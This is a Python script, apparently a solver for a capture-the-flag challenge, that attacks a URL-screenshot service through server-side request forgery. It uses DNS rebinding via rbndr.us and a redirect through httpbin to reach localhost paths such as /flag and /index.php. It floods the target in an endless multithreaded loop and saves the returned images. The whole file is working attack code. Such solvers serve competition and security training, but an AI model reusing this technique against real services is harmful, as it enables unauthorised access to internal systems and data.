import requests
import re
import base64
import hashlib
import time
from concurrent.futures import ThreadPoolExecutor

URL = "https://poiuytrewqazx-csc26.cybersecuritychallenge.al/analizo"

# DNS Rebinding with Paths
BASE_DOMAIN = "http://08080808.7f000001.rbndr.us"
PATHS = [
    "/flag",
    "/flag.txt",
    "/",
    "/index.php", # check if source code is dumped?
    "/robots.txt"
]

# Simple Redirects (Backup)
REDIRECT_BASE = "https://httpbin.org/redirect-to?url=http://127.0.0.1"


seen_hashes = set()

def save_image(b64, label):
    try:
        raw = base64.b64decode(b64)
        h = hashlib.md5(raw).hexdigest()
        if h in seen_hashes:
            return
        seen_hashes.add(h)
        
        fn = f"flag_hunt_{label}_{h[:6]}.png"
        with open(fn, "wb") as f:
            f.write(raw)
        print(f"[+] SAVED UNIQUE IMAGE: {fn} (Size: {len(raw)})")
    except:
        pass

def attack(url_target):
    try:
        # label for filename
        label = re.sub(r'[^a-zA-Z0-9]', '', url_target)[-10:]
        
        r = requests.post(URL, data={"url": url_target, "submit": "Analizo"}, timeout=20)
        
        match = re.search(r'src="data:image/png;base64,([^"]+)"', r.text)
        if match:
            save_image(match.group(1), label)
    except Exception as e:
        # print(f"Error {url_target}: {e}")
        pass

def spam_task(path):
    # Construct full URL
    # 1. Rebinding
    target = BASE_DOMAIN + path
    attack(target)
    
    # 2. Redirect
    target2 = REDIRECT_BASE + path
    attack(target2)

def main():
    print("Starting Flag Hunt (Solver V4)...")
    print("Spamming DNS Rebinding paths...")
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        while True:
            for p in PATHS:
                executor.submit(spam_task, p)
            time.sleep(0.5)

if __name__ == "__main__":
    main()
